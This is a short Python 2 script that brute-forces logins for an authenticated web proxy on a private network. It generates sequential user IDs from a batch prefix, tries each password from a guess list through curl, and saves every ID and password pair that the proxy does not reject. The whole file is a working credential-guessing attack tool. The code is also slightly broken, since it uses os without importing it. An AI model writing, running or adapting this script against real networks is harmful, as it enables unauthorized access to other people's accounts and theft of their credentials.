import commands
def idLength(id):
	if len(id)==1:r="000"+id
	elif len(id)==2:r="00"+id
	elif len(id)==3:r="0"+id
	else:r=id
	return r
working=open("working+.txt","w")
a=open("guessPassList.txt","r")
PassList=a.read().split(",")
idn=raw_input("batchID:").upper()
for i in range(input("range:")+1):
	ID=idn+idLength(str(i))
	os.system("wget --spider http://www.google.co.in")
	for j in range(len(PassList)):
	    proxyAuth="http://"+ID+":"+PassList[j]+"@10.1.3.11:3128/"
	    com=commands.getstatusoutput("curl --proxy "+proxyAuth+" --head http://www.google.co.in")
	    statusCode = com[1].split("\n")[3].split()[1]
	    if statusCode != "407":
			working.write(ID+":"+PassList[j]+"\n") #302,200 status codes
			break
	print ID+":"+PassList[j]+" "+statusCode
